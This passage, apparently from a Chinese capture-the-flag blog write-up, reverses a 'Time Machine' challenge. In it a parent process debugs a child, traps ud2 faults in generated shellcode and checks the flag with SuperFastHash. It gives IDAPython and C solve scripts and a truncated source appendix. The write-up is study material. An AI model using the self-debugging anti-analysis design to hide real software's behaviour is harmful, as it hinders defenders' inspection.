title="sub_40195C-父进程"></a>sub_40195C-父进程</h2><p>设置环境变量<code>ix221iscc221=1</code>，然后开一个子进程并调试，子进程进输入分支()<br> <img src="/2024/07/26/%E8%AE%B0%E7%94%B1%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9BTime-Machine%E6%8E%8C%E6%8F%A1%E7%88%B6%E5%AD%90%E8%BF%9B%E7%A8%8B%E5%B9%B6%E5%87%BA%E9%A2%98/6669ad43d9c307b7e9600b51.png" alt="222"><br>当调试出现异常时去看输出<code>Correct Flag :)\n</code>的函数<br>superhash算法逐字节加密<br> <img src="/2024/07/26/%E8%AE%B0%E7%94%B1%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9BTime-Machine%E6%8E%8C%E6%8F%A1%E7%88%B6%E5%AD%90%E8%BF%9B%E7%A8%8B%E5%B9%B6%E5%87%BA%E9%A2%98/6669ad76d9c307b7e9609830.png" alt="333"><br>断点调试一下</p><p>发现了0f 0b<br>检查这两个字节是否为<code>0F 0B</code>，很巧，刚好是子进程中的<code>ud2</code>，很明显这里在捕获子进程在<code>ud2</code>指令出错.<br> <img src="/2024/07/26/%E8%AE%B0%E7%94%B1%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9BTime-Machine%E6%8E%8C%E6%8F%A1%E7%88%B6%E5%AD%90%E8%BF%9B%E7%A8%8B%E5%B9%B6%E5%87%BA%E9%A2%98/6669addbd9c307b7e961b5cd.png" alt="6"><br>接下来就是看加密flag逻辑，可以看到<br>取r12b，进行加密操作后结果与r11d校验，最后检查r13是否为1，两个校验都通过，计数器+1，计数器等于0x18时输出正确（flag长度为0x18)</p><h2 id="sub-401584-enc-function"><a href="#sub-401584-enc-function" class="headerlink" title="sub_401584 - enc function"></a>sub_401584 - enc function</h2><h3 id="解法一：梭哈！"><a href="#解法一：梭哈！" class="headerlink" title="解法一：梭哈！"></a>解法一：梭哈！</h3><p>因为是一个一个字节的输入，中间只会case 1<br>直接把1字节的256种结果全部算出来，后面梭哈就好<br> <img src="/2024/07/26/%E8%AE%B0%E7%94%B1%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9BTime-Machine%E6%8E%8C%E6%8F%A1%E7%88%B6%E5%AD%90%E8%BF%9B%E7%A8%8B%E5%B9%B6%E5%87%BA%E9%A2%98/6669ae2cd9c307b7e962b4dc.png" alt="7"><br>调回子进程的shellcode<br> <img src="/2024/07/26/%E8%AE%B0%E7%94%B1%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9BTime-Machine%E6%8E%8C%E6%8F%A1%E7%88%B6%E5%AD%90%E8%BF%9B%E7%A8%8B%E5%B9%B6%E5%87%BA%E9%A2%98/6669ae52d9c307b7e9631bd9.png" alt="8"><br>现在就知道子进程在干嘛了，先从flag取一个字节到r12b，再计算r11d，给r13赋值，前面分析父进程知道只有在<code>r13==1</code>时才进行校验，用idapython解析一下，在<code>r13==1</code>时查表r11d得到r12b，即得到flag的一个字节<br>exp</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">import idc</span><br><span class="line"></span><br><span class="line">m = {}</span><br><span class="line">for c in range(256):</span><br><span class="line">    l1 = 1</span><br><span class="line">    l2 = ((c + l1) &lt;&lt; 10) ^ (c + l1)</span><br><span class="line">    l1 = (l2 &gt;&gt; 1) + l2</span><br><span class="line">    l3 = (((8 * l1) ^ l1) &gt;&gt; 5) + ((8 * l1) ^ l1)</span><br><span class="line">    l3 &amp;= 0xFFFFFFFF</span><br><span class="line">    l4 = (((16 * l3) ^ l3) &gt;&gt; 17) + ((16 * l3) ^ l3)</span><br><span class="line">    l4 &amp;= 0xFFFFFFFF</span><br><span class="line">    r = (l4 &lt;&lt; 25) ^ l4</span><br><span class="line">    r &amp;= 0xFFFFFFFF</span><br><span class="line">    r = (r &gt;&gt; 6) + r</span><br><span class="line">    r &amp;= 0xFFFFFFFF</span><br><span class="line">    print(hex(c), hex(r))</span><br><span class="line">    m[r] = c</span><br><span class="line"></span><br><span class="line">start = 0x1E0000</span><br><span class="line">end = start + 0x22a6 #VirtualAlloc</span><br><span class="line"></span><br><span class="line">ea = start</span><br><span class="line">while (ea &lt; end):</span><br><span class="line">    # mov r12b, [rcx+i]</span><br><span class="line">    ins_len = idc.create_insn(ea)</span><br><span class="line">    ins = idc.generate_disasm_line(ea, 0) </span><br><span class="line">    if (ins == "retn"):</span><br><span class="line">        break</span><br><span class="line">    ea += ins_len</span><br><span class="line">    # mov r11, k</span><br><span class="line">    ins_len = idc.create_insn(ea)</span><br><span class="line">    ins = idc.generate_disasm_line(ea, 0) </span><br><span class="line">    k1 = idc.print_operand(ea, 1)</span><br><span class="line">    k1 = int("0x"+k1[:-1], 16)</span><br><span class="line">    ea += ins_len</span><br><span class="line">    # xor r11, k</span><br><span class="line">    ins_len = idc.create_insn(ea)</span><br><span class="line">    ins = idc.generate_disasm_line(ea, 0) </span><br><span class="line">    k2 = idc.print_operand(ea, 1)</span><br><span class="line">    k2 = int("0x"+k2[:-1], 16)</span><br><span class="line">    ea += ins_len</span><br><span class="line">    # ror r11, k</span><br><span class="line">    ins_len = idc.create_insn(ea)</span><br><span class="line">    ins = idc.generate_disasm_line(ea, 0) </span><br><span class="line">    k3 = idc.print_operand(ea, 1)</span><br><span class="line">    k3 = int("0x"+k3[:-1], 16)</span><br><span class="line">    ea += ins_len</span><br><span class="line">    r11 = (((k1 ^ k2) &gt;&gt; k3) | ((k1 ^ k2) &lt;&lt; (64 - k3))) &amp; 0xFFFFFFFFFFFFFFFF</span><br><span class="line">    # mov r13, 0/1</span><br><span class="line">    ins_len = idc.create_insn(ea)</span><br><span class="line">    ins = idc.generate_disasm_line(ea, 0) </span><br><span class="line">    r13 = idc.print_operand(ea, 1)</span><br><span class="line">    r13 = int(r13)</span><br><span class="line">    ea += ins_len</span><br><span class="line">    # ud2</span><br><span class="line">    ins_len = idc.create_insn(ea)</span><br><span class="line">    ins = idc.generate_disasm_line(ea, 0) </span><br><span class="line">    ea += ins_len</span><br><span class="line">    if (r13 == 1):</span><br><span class="line">        print(chr(m[r11]), end='')</span><br></pre></td></tr></tbody></table></figure><p>得解<br> <img src="/2024/07/26/%E8%AE%B0%E7%94%B1%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9BTime-Machine%E6%8E%8C%E6%8F%A1%E7%88%B6%E5%AD%90%E8%BF%9B%E7%A8%8B%E5%B9%B6%E5%87%BA%E9%A2%98/6669aebdd9c307b7e9644b7e.png" alt="9"></p><h3 id="解法二：正常解法"><a href="#解法二：正常解法" class="headerlink" title="解法二：正常解法"></a>解法二：正常解法</h3><p>这个加密算法是使用 SuperFastHash 算法对输入的每个字符进行散列，然后与一些硬编码的散列进行比较。<br>加密源码</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">uint32_t hash(char *a1)</span><br><span class="line">{</span><br><span class="line">    uint32_t v2;</span><br><span class="line">    uint32_t v3;</span><br><span class="line">    uint32_t v4;</span><br><span class="line">    uint32_t v5;</span><br><span class="line">    uint32_t v6;</span><br><span class="line">    uint32_t v7;</span><br><span class="line">    uint32_t v8;</span><br><span class="line">    uint32_t v9;</span><br><span class="line">    uint32_t v10;</span><br><span class="line">    uint32_t v11;</span><br><span class="line">    uint32_t i;</span><br><span class="line">    unsigned char* v13;</span><br><span class="line">    v13 = a1;</span><br><span class="line">    v4 = 1;</span><br><span class="line">    v2 = v4 &amp; 3;</span><br><span class="line">    for (i = v4 &gt;&gt; 2; i &gt; 0; --i)</span><br><span class="line">    {</span><br><span class="line">        v5 = (v13[1] &lt;&lt; 8) + *v13 + v4;</span><br><span class="line">        v3 = v5 ^ (((v13[3] &lt;&lt; 8) + v13[2]) &lt;&lt; 11);</span><br><span class="line">        v13 += 4;</span><br><span class="line">        v4 = (((v5 &lt;&lt; 16) ^ v3) &gt;&gt; 11) + ((v5 &lt;&lt; 16) ^ v3);</span><br><span class="line">    }</span><br><span class="line">    switch (v2)</span><br><span class="line">    {</span><br><span class="line">    case 2:</span><br><span class="line">        v8 = (v13[1] &lt;&lt; 8) + *v13 + v4;</span><br><span class="line">        v4 = (((v8 &lt;&lt; 11) ^ v8) &gt;&gt; 17) ^ (v8 &lt;&lt; 11) ^ v8;</span><br><span class="line">        break;</span><br><span class="line">    case 3:</span><br><span class="line">        v6 = (v13[1] &lt;&lt; 8) + *v13 + v4;</span><br><span class="line">        v7 = (v13[2] &lt;&lt; 18) ^ (v6 &lt;&lt; 16) ^ v6;</span><br><span class="line">        v4 = (v7 &gt;&gt; 11) + v7;</span><br><span class="line">        break;</span><br><span class="line">    case 1:</span><br><span class="line">        v9 = ((*v13 + v4) &lt;&lt; 10) ^ (*v13 + v4);</span><br><span class="line">        v4 = (v9 &gt;&gt; 1) + v9;</span><br><span class="line">        break;</span><br><span class="line">    }</span><br><span class="line">    v10 = (((8 * v4) ^ v4) &gt;&gt; 5) + ((8 * v4) ^ v4);</span><br><span class="line">    v11 = (((16 * v10) ^ v10) &gt;&gt; 17) + ((16 * v10) ^ v10);</span><br><span class="line">    return (((v11 &lt;&lt; 25) ^ v11) &gt;&gt; 6) + ((v11 &lt;&lt; 25) ^ v11);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>常规解题方法步骤<br>1、提取shellcode代码块</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">with open("instructions.txt") as f:</span><br><span class="line">    lines = f.readlines()</span><br><span class="line"></span><br><span class="line">blocks = []</span><br><span class="line">block = []</span><br><span class="line"></span><br><span class="line">for line in lines:</span><br><span class="line">    line = line.strip()</span><br><span class="line">    if line:</span><br><span class="line">        block.append(line)</span><br><span class="line">        if line == "ud2":</span><br><span class="line">            blocks.append(block)</span><br><span class="line">            block = []</span><br><span class="line"></span><br><span class="line">with open("1.txt", "w") as out_file:</span><br><span class="line">    for b in blocks:</span><br><span class="line">        if "mov     r13, 1" in b[4]:</span><br><span class="line">            out_file.write("\n".join(b) + "\n")</span><br></pre></td></tr></tbody></table></figure><p>2、筛选出正确的代码块，得到正确密文的hash</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">def extract_ciphers(filename):</span><br><span class="line">    try:</span><br><span class="line">        with open(filename) as f:</span><br><span class="line">            lines = f.readlines()</span><br><span class="line">    except FileNotFoundError:</span><br><span class="line">        print("Error: File not found")</span><br><span class="line">        return []</span><br><span class="line"></span><br><span class="line">    ciphers = []</span><br><span class="line">    for i in range(0, len(lines), 6):</span><br><span class="line">        block = lines[i:i+6]</span><br><span class="line"></span><br><span class="line">        # 检查块的长度是否足够</span><br><span class="line">        if len(block) &lt; 2:</span><br><span class="line">            print("Error: Block does not have enough lines")</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line">        # 提取第二行中的十六进制数值</span><br><span class="line">        line = block[1].strip()</span><br><span class="line">        start_index = line.find("r11, ") + len("r11, ")</span><br><span class="line">        end_index = line.find("h", start_index)</span><br><span class="line">        if start_index != -1 and end_index != -1:</span><br><span class="line">            cipher_str = line[start_index:end_index]</span><br><span class="line">            try:</span><br><span class="line">                cipher_value = int(cipher_str, 16)</span><br><span class="line">                cipher_value ^= 0x1337</span><br><span class="line">                res = ror(cipher_value, 0xd, 64)</span><br><span class="line">                ciphers.append(res)</span><br><span class="line">            except ValueError:</span><br><span class="line">                print("Error: Invalid hex value")</span><br><span class="line"></span><br><span class="line">    return ciphers</span><br><span class="line"></span><br><span class="line">def ror(val, r_bits, max_bits):</span><br><span class="line">    return ((val &amp; (2**max_bits-1)) &gt;&gt; r_bits%max_bits) | \</span><br><span class="line">           (val &lt;&lt; (max_bits-(r_bits%max_bits)) &amp; (2**max_bits-1))</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    ciphers = extract_ciphers("clean_diassembly.txt")</span><br><span class="line">    if ciphers:</span><br><span class="line">        print("Ciphers:", ciphers)</span><br><span class="line"></span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">    main()</span><br></pre></td></tr></tbody></table></figure><p>3、hash解密</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">#define _CRT_SECURE_NO_WARNINGS 1</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line"></span><br><span class="line">uint32_t hash(char* a1)</span><br><span class="line">{</span><br><span class="line">    uint32_t v2;</span><br><span class="line">    uint32_t v3;</span><br><span class="line">    uint32_t v4;</span><br><span class="line">    uint32_t v5;</span><br><span class="line">    uint32_t v6;</span><br><span class="line">    uint32_t v7;</span><br><span class="line">    uint32_t v8;</span><br><span class="line">    uint32_t v9;</span><br><span class="line">    uint32_t v10;</span><br><span class="line">    uint32_t v11;</span><br><span class="line">    uint32_t i;</span><br><span class="line">    char* v13;</span><br><span class="line">    v13 = a1;</span><br><span class="line">    v4 = 1;</span><br><span class="line">    v2 = v4 &amp; 3;</span><br><span class="line">    for (i = v4 &gt;&gt; 2; i &gt; 0; --i)</span><br><span class="line">    {</span><br><span class="line">        v5 = (v13[1] &lt;&lt; 8) + *v13 + v4;</span><br><span class="line">        v3 = v5 ^ (((v13[3] &lt;&lt; 8) + v13[2]) &lt;&lt; 11);</span><br><span class="line">        v13 += 4;</span><br><span class="line">        v4 = (((v5 &lt;&lt; 16) ^ v3) &gt;&gt; 11) + ((v5 &lt;&lt; 16) ^ v3);</span><br><span class="line">    }</span><br><span class="line">    switch (v2)</span><br><span class="line">    {</span><br><span class="line">    case 2:</span><br><span class="line">        v8 = (v13[1] &lt;&lt; 8) + *v13 + v4;</span><br><span class="line">        v4 = (((v8 &lt;&lt; 11) ^ v8) &gt;&gt; 17) ^ (v8 &lt;&lt; 11) ^ v8;</span><br><span class="line">        break;</span><br><span class="line">    case 3:</span><br><span class="line">        v6 = (v13[1] &lt;&lt; 8) + *v13 + v4;</span><br><span class="line">        v7 = (v13[2] &lt;&lt; 18) ^ (v6 &lt;&lt; 16) ^ v6;</span><br><span class="line">        v4 = (v7 &gt;&gt; 11) + v7;</span><br><span class="line">        break;</span><br><span class="line">    case 1:</span><br><span class="line">        v9 = ((*v13 + v4) &lt;&lt; 10) ^ (*v13 + v4);</span><br><span class="line">        v4 = (v9 &gt;&gt; 1) + v9;</span><br><span class="line">        break;</span><br><span class="line">    }</span><br><span class="line">    v10 = (((8 * v4) ^ v4) &gt;&gt; 5) + ((8 * v4) ^ v4);</span><br><span class="line">    v11 = (((16 * v10) ^ v10) &gt;&gt; 17) + ((16 * v10) ^ v10);</span><br><span class="line">    return (((v11 &lt;&lt; 25) ^ v11) &gt;&gt; 6) + ((v11 &lt;&lt; 25) ^ v11);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">{</span><br><span class="line">    uint32_t flag_hashes[] = { 3250317036, 2059931180, 831843374, 831843374, 2137638942, 291415938, 3060405360, 51373921, 291415938, 1891737825, 2577271396, 2682404089, 1319470528, 291415938, 2577271396, 2376513170, 291415938, 2685652659, 1867828354, 1457933662, 260209567, 2240464916, 3927678806, 2884595695 };</span><br><span class="line">    char val[2] = { 0 };</span><br><span class="line">    uint32_t all_hashes[256] = { 0 };</span><br><span class="line">    for (int i = 0; i &lt; 256; i++)</span><br><span class="line">    {</span><br><span class="line">        val[0] = i;</span><br><span class="line">        all_hashes[i] = hash(val);</span><br><span class="line">    }</span><br><span class="line">    for (int i = 0; i &lt; 39; i++)</span><br><span class="line">    {</span><br><span class="line">        for (int j = 0; j &lt; 256; j++)</span><br><span class="line">        {</span><br><span class="line">            if (flag_hashes[i] == all_hashes[j])</span><br><span class="line">            {</span><br><span class="line">                printf("%c", j);</span><br><span class="line">                break;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    return 1;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>希望本文能让大家对于父子进程的理解更好一点点，哈哈哈<br>还是那句话，掌握一道题目的最好办法就是由做题人变成出题人。</p><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p>如有想要实验的，附源码一份</p><p>如有需要，细节联系我</p><p>题目源码</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> counter = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> !defined (Get16Bits)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Get16Bits(d) ((((UINT32)(((const UINT8*)(d))[1])) &lt;&lt; 8)\</span></span><br><span class="line"><span class="meta">                       +(UINT32)(((const UINT8*)(d))[0]) )</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">SIZE_T <span class="title">StringLengthA</span><span class="params">(LPCSTR String)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    LPCSTR String2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (String2 = String; *String2; ++String2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (String2 - String);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function">UINT32 <span class="title">HashStringSuperFastHashA</span><span class="params">(PCHAR String)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    INT Length = <span class="built_in">StringLengthA</span>(String);</span><br><span class="line">    <span class="comment">//printf("[+] Len=%d\n", Length);</span></span><br><span class="line">    UINT32 Hash = Length;</span><br><span class="line">    INT Tmp = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    INT Rem = Length &amp; <span class="number">3</span>;</span><br><span class="line">    Length &gt;&gt;= <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (; Length &gt; <span class="number">0</span>; Length--)</span><br><span class="line">    {</span><br><span class="line">        Hash += <span class="built_in">Get16Bits</span>(String);</span><br><span class="line">        Tmp = (<span class="built_in">Get16Bits</span>(String + <span class="number">2</span>) &lt;&lt; <span class="number">11</span>) ^ Hash;</span><br><span class="line">        Hash = (Hash &lt;&lt; <span class="number">16</span>) ^ Tmp;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>( push )</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>( disable : 6305)</span></span><br><span class="line">        String += <span class="number">2</span> * <span 